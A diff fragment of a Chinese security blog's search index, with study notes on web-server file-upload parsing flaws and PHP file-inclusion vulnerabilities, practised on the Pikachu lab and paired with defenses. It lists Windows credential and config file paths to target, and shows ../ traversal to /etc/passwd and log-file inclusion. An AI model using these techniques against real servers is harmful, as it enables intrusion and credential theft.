+<p>php配置问题：一个文件路径后面加上/xx.php会将原来的文件解析为php文件</p>
+<p>Apache(1.x、2.x)</p>
+<p>1.php.xx1.xx2</p>
+<p>apache是从右往左解析，遇到不认识的扩展名则跳过，直到遇到认识的php为止</p>
+<p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<br>test.jpg/1.php</p>
+<p>fastcgi在处理’.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了’/test.jpg’。</p>
+<p>最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将’.jpg’等文件当做代码解析。</p>
+<p>防御<br>1.文件类型判断</p>
+<p>后缀白名单，MIME类型判断结合</p>
+<p>2.文件重命名</p>
+<p>3.文件上传目录设置为不可执行</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2022/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>简介<br>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p>
+<p>类型<br>根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>1.本地文件包含漏洞（LFI）：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击者更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>2.远程文件包含漏洞（RFI）：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况很严重。</p>
+<p>原理<br>以PHP为例，在PHP中，提供了以下文件包含函数：</p>
+<p>include:找不到文件产生警告，脚本继续运行。<br>include_once：相对于include，文件被包含后不会再次被包含。<br>require：找不到文件，产生致命错误，脚本停止。<br>require_once：相对于require，文件被包含后不会再次被包含。<br>这些函数在代码设计中被经常使用到。大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。</p>
+<p>攻击<br>使用靶机：pikachu</p>
+<p>FileInclusion(local)<br>我们选择一个NBA player，可以看到url，filename参数可以修改。</p>
+<p>Windows敏感文件</p>
+<p>Windows敏感文件<br>文件路径    文件作用<br>c:\boot.ini                                       查看系统版本<br>c:\Windows\system32\inetsrvMetaBase.xml    IIS配置文件<br>c:\Windows\php.ini                                       php配置信息<br>c:\Windows\my.ini         mysql配置文件，记录管理员登陆过的MYSQL用户名和密码<br>c:\Windows\system.ini                                  winnt的php配置信息<br>c:\Windows\win.ini                                         winnt的mysql配置文件<br>c:\mysql\data\mysql\user.MYD                   mysql.user表中的数据库连接密码<br>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini    存储了虚拟主机网站路径和密码<br>c:\windows\system32\inetsrv\MetaBase.xml    查看IIS的虚拟主机配置<br>c:\windows\repair\sam    WINDOWS系统初次安装的密码<br>c:\Program Files\ Serv-U\ServUAdmin.exe    6.0版本以前的serv-u管理员密码<br>c:\Program Files\RhinoSoft.com\ServUDaemon.exe<br>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件     存储了pcAnywhere的登陆密码<br>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf    查看WINDOWS系统apache文件<br>c:/Resin-3.0.14/conf/resin.conf    查看jsp开发的网站resin文件配置信息.<br>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf    查看linux系统配置的JSP虚拟主机<br>d:\APACHE\Apache2\conf\httpd.conf<br>C:\mysql\data\mysql\user.MYD    存在MYSQL系统中的用户密码<br>C:\Windows\System32\drivers\etc\hostswinserver    配置Telnet信息</p>
+<p>测试<br>我测试了一下，发现不可以，因为它限制了include目录下，不过，我们可以使用../来到磁盘下的任意目录。</p>
+<p>../切换目录<br>结合文件上传漏洞在../../unsafeupload/uploads/下的上传的文件，可以实现php代码的运行。</p>
+<p>仅本地文件包含<br>仅本地文件包含时，</p>
+<p>可以查看本地敏感文件，如/etc/passwd等</p>
+<p>可以包含日志文件，通过其他手段写到日志文件，如WAF日志，ssh登录日志</p>
+<p>防御<br>文件包含参数写死<br>文件包含参数不可由用户修改<br>禁用目录跳转字符”../“<br>使用文件验证白名单</p>
+]]></content>
+  </entry>
 </search>
